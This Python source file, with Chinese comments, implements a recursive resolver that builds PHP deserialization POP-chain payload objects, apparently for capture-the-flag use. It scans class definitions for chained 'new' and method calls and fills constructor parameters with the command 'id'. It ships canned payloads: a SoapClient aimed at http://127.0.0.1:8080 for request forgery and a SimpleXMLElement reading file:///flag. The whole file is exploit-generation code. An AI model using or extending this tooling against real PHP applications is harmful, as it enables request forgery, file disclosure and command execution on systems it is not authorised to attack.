import re
from typing import Dict, List, Optional, Any

class PopChainResolver:
    """多级 POP 链递归解析器"""
    
    BUILTIN_EXPLOIT_CLASSES = ['SoapClient', 'SimpleXMLElement', 'SplFileObject']
    MAX_DEPTH = 10

    def __init__(self, class_map: Dict[str, Any]):
        self.class_map = class_map
        self.visited = set()

    def resolve_chain(self, entry_class_name: str, features: Any) -> Dict[str, Any]:
        """
        从入口类开始解析完整的 POP 链
        :return: 嵌套的对象字典结构
        """
        self.visited.clear()
        return self._resolve_recursive(entry_class_name, depth=0)

    def _resolve_recursive(self, class_name: str, depth: int) -> Optional[Dict[str, Any]]:
        if depth > self.MAX_DEPTH:
            print(f"[PopResolver] Warning: Max depth {self.MAX_DEPTH} reached for {class_name}")
            return None
        
        if class_name in self.visited:
            return None # 防止环状链
            
        self.visited.add(class_name)

        # 1. 如果是内置类，直接生成利用对象
        if class_name in self.BUILTIN_EXPLOIT_CLASSES:
            return self._generate_builtin_payload(class_name)

        # 2. 查找类定义
        cls_info = self.class_map.get(class_name)
        if not cls_info:
            return None

        # 3. 扫描该类中的 new 表达式或方法调用
        nested_props = {}
        for method in cls_info.methods.values():
            expressions = self._scan_new_expressions(method.body)
            for expr in expressions:
                source_prop = expr['source_property']
                
                target_cls_name = None
                # 如果是方法调用 $this->prop->method()，我们需要找到 prop 的类型
                if expr.get('is_method_call'):
                    # 尝试在所有类中寻找含有该方法的类
                    for cname, cinfo in self.class_map.items():
                        if expr['method_name'] in cinfo.methods or '__call' in cinfo.methods:
                            target_cls_name = cname
                            break
                else:
                    target_cls_name = expr['target_class']
                
                if not target_cls_name:
                    continue
                    
                # 递归解析下一级
                sub_obj = self._resolve_recursive(target_cls_name, depth + 1)
                if sub_obj:
                    nested_props[source_prop] = sub_obj

        # 4. 构造当前类的对象结构
        result = {
            'class_name': class_name,
            'properties': {},
            'visibilities': {},
            'nested_objects': nested_props # 记录需要合并的嵌套对象
        }

        # 提取当前类的属性默认值
        for name, p_info in cls_info.properties.items():
            result['properties'][name] = str(p_info.default_value).strip("'\"") if p_info.default_value else ''
            result['visibilities'][name] = p_info.visibility
        
        # 关键修复：从构造函数中提取赋值逻辑（覆盖默认值）
        if '__construct' in cls_info.methods:
            body = cls_info.methods['__construct'].body
            # 提取 $this->xxx = 'yyy'
            assign_pattern = r'\$this->(\w+)\s*=\s*[\'"]([^\'"]+)[\'"]'
            for m in re.finditer(assign_pattern, body):
                prop_name = m.group(1)
                prop_value = m.group(2)
                # 关键修复：只设置一次，避免后续方法（如 __wakeup）中的赋值覆盖
                if prop_name not in result['properties'] or not result['properties'][prop_name]:
                    result['properties'][prop_name] = prop_value
                    if prop_name in cls_info.properties:
                        result['visibilities'][prop_name] = cls_info.properties[prop_name].visibility
            
            # 提取 $this->xxx = $param (参数传递)
            param_assign_pattern = r'\$this->(\w+)\s*=\s*\$(\w+)'
            for m in re.finditer(param_assign_pattern, body):
                prop_name = m.group(1)
                # 简化：使用默认值 'id'
                if prop_name not in result['properties'] or not result['properties'][prop_name]:
                    result['properties'][prop_name] = 'id'
                    if prop_name in cls_info.properties:
                        result['visibilities'][prop_name] = cls_info.properties[prop_name].visibility

        return result

    def _scan_new_expressions(self, body: str) -> List[Dict[str, str]]:
        """扫描方法体中的 new ClassName($this->prop) 或 $this->prop->method()"""
        results = []
        # 匹配 new B($this->cmd)
        for match in re.finditer(r'new\s+(\w+)\s*\(\s*\$this->(\w+)', body):
            results.append({
                'target_class': match.group(1),
                'source_property': match.group(2),
                'is_method_call': False
            })
        # 匹配 $this->handler->run() (用于多级链追踪)
        for match in re.finditer(r'\$this->(\w+)->(\w+)\s*\(', body):
            prop_name = match.group(1)
            method_name = match.group(2)
            
            # 通过方法名在所有类中查找可能的目标类
            target_cls_name = None
            for cname, cinfo in self.class_map.items():
                if method_name in cinfo.methods or '__call' in cinfo.methods:
                    target_cls_name = cname
                    break
            
            if target_cls_name:
                results.append({
                    'target_class': target_cls_name,
                    'source_property': prop_name,
                    'is_method_call': True,
                    'method_name': method_name
                })
        return results

    def _generate_builtin_payload(self, class_name: str) -> Dict[str, Any]:
        """生成内置类的利用 Payload"""
        if class_name == 'SoapClient':
            return {
                'class_name': 'SoapClient',
                'properties': {
                    'uri': 'http://127.0.0.1:8080',
                    'location': 'http://127.0.0.1:8080'
                },
                'visibilities': {'uri': 'public', 'location': 'public'},
                'is_builtin': True
            }
        elif class_name == 'SimpleXMLElement':
            return {
                'class_name': 'SimpleXMLElement',
                'properties': {'data': 'file:///flag'},
                'visibilities': {'data': 'public'},
                'is_builtin': True
            }
        return None
